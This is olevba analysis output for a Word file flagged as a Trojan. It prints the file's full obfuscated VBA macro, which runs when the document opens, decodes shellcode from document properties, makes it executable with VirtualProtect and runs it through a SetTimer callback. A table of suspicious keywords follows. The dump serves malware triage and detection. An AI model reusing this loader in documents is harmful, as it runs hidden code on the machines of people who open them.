olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Shelod.gen-cd8331e79ce1999be4a2aee680fb1f8dc7f6c8a8d4f2e9aaa55d40583c7ef574
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.Shelod.gen-cd8331e79ce1999be4a2aee680fb1f8dc7f6c8a8d4f2e9aaa55d40583c7ef574 - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#If VBA7 Then
Private Declare PtrSafe Function ProloguiserPavers Lib "user32" Alias "SetTimer" (ByVal BushmanShowcasing As LongPtr, ByVal WorkshyEncaseLiquet As LongPtr, ByVal ExpiatingSubequallyCommissar As LongPtr, ByVal BiconcaveRotatoryPositive As LongPtr) As LongPtr
Private Declare PtrSafe Function BillettyRemerge Lib "user32" Alias "KillTimer" (ByVal ReindicationNondescriptiveness As LongPtr, ByVal CosmopolicyMicropetrography As LongPtr) As LongPtr
Private Declare PtrSafe Function UngaudilyCaterwauling Lib "kernel32" Alias "VirtualProtect" (ByVal UncombinablyDeaurate As LongPtr, ByVal CapitateGratefuller As LongPtr, ByVal ChetahPecker As LongPtr, AdzerHoglike As LongPtr) As LongPtr
#Else
Private Declare Function ProloguiserPavers Lib "user32" Alias "SetTimer" ( ByVal OxygenatingVerificationSlinkiness As Long, ByVal WhoredomPhalansterian As Long, ByVal VandalizeRumage As Long, ByVal FutilizeDishelmedDenaries As Any) As Long
Private Declare Function BillettyRemerge Lib "user32" Alias "KillTimer" ( ByVal WhiskyBrilliantinedTragedietta As Long, ByVal UnintelligibilityPersonshipDrafters As Long) As Long
Private Declare Function UngaudilyCaterwauling Lib "kernel32" Alias "VirtualProtect"  (ByVal MesoplastraCombatersSerialise As Long, ByVal AlbertypeWattsSortilegious As Long, ByVal UncoftDisunifying As Long, InserveUnattributivelyArenicolite As Long) As Long
#End If
Private Sub Document_Open()
Dim BezantySubpectination() As Byte
#If Win64 Then
BezantySubpectination = BystandersTelecomputingDephosphorize(ActiveDocument.BuiltInDocumentProperties(Nqh4wxGLGf("ASPp7RhT3")).Value)
#Else
BezantySubpectination = BystandersTelecomputingDephosphorize(ActiveDocument.BuiltInDocumentProperties(Nqh4wxGLGf("Elkvwu2X")).Value)
#End If
#If VBA7 Then
Dim IndumentumsDentaliumsImplacentalia As LongPtr
Dim RelevationNonincreasable As LongPtr
Dim shellCode As LongPtr
Dim RithePlacarded As LongPtr
#Else
Dim IndumentumsDentaliumsImplacentalia As Long
Dim RelevationNonincreasable As Long
Dim shellCode As Long
Dim RithePlacarded As Long
#End If
RelevationNonincreasable = UBound(BezantySubpectination) + 1
shellCode = VarPtr(BezantySubpectination(0))
UngaudilyCaterwauling shellCode, RelevationNonincreasable, 64, VarPtr(IndumentumsDentaliumsImplacentalia)
GetObject(Nqh4wxGLGf("RSeQXYB")).Environment(Nqh4wxGLGf("AqvBnApYX8SIc"))(Nqh4wxGLGf("QhJtp47iARhm")) = ActiveDocument.FullName
GetObject(Nqh4wxGLGf("hNPBX9A7ROaD")).Environment(Nqh4wxGLGf("Div9q03w"))(Nqh4wxGLGf("AYcMsoLnvdyfB")) = Nqh4wxGLGf("szNguoq")
RithePlacarded = ProloguiserPavers(0, shellCode, 1, shellCode)
SikharaExpungesUngroomed 1
BillettyRemerge 0, RithePlacarded
GetObject(Nqh4wxGLGf("Xm5sFFSxv")).Environment(Nqh4wxGLGf("esr9C1KoP")).Remove (Nqh4wxGLGf("hnblIZ4"))
GetObject(Nqh4wxGLGf("sfFP1nHq")).Environment(Nqh4wxGLGf("uiiu0uG0B0")).Remove (Nqh4wxGLGf("OAbcjWjDB"))
ReDim BezantySubpectination(1)
End Sub
Sub SikharaExpungesUngroomed(Finish)
Dim SupervisivePenannular As Long
Dim PraxesCristiTempestuous As Long
PraxesCristiTempestuous = Timer() + (Finish)
Do
SupervisivePenannular = Timer()
DoEvents
Loop Until SupervisivePenannular > PraxesCristiTempestuous
End Sub
Public Function Nqh4wxGLGf(strInput)
Nqh4wxGLGf = StrReverse(ActiveDocument.CustomDocumentProperties(strInput))
End Function
Function AnnalismSchoolboyish(OutchatterWauchleSupermodest, BuckramWheem)
AnnalismSchoolboyish = Mid(OutchatterWauchleSupermodest, BuckramWheem + 1, 1)
End Function
Function KnappersNitrous(MiscallerOverskirtObtuser) As Long
If Int(Rnd(23)) > 2 Then
KnappersNitrous = 9000
Else
KnappersNitrous = Len(MiscallerOverskirtObtuser)
End If
End Function
Function BystandersTelecomputingDephosphorize(PrepartakeFanaticizingLegislatrixes)
ReDim MogiphoniaSculptograph(KnappersNitrous(PrepartakeFanaticizingLegislatrixes) - 1) As Byte
Dim UncapsCounterobligation As Long, BrunchingPreponderating As Long
Dim TransoceanicGesteningCircumfer: TransoceanicGesteningCircumfer = Nqh4wxGLGf("TzV_slAm4") & Nqh4wxGLGf("ysJJhQ")
For UncapsCounterobligation = 0 To KnappersNitrous(PrepartakeFanaticizingLegislatrixes) - 1 Step 2
BrunchingPreponderating = UncapsCounterobligation / 2
MogiphoniaSculptograph(BrunchingPreponderating) = CDec(TransoceanicGesteningCircumfer & AnnalismSchoolboyish(PrepartakeFanaticizingLegislatrixes, UncapsCounterobligation) & AnnalismSchoolboyish(PrepartakeFanaticizingLegislatrixes, UncapsCounterobligation + 1))
Next
BystandersTelecomputingDephosphorize = MogiphoniaSculptograph
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VirtualProtect      |May inject code into another process         |
|Suspicious|SetTimer            |May run a shellcode in memory                |
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

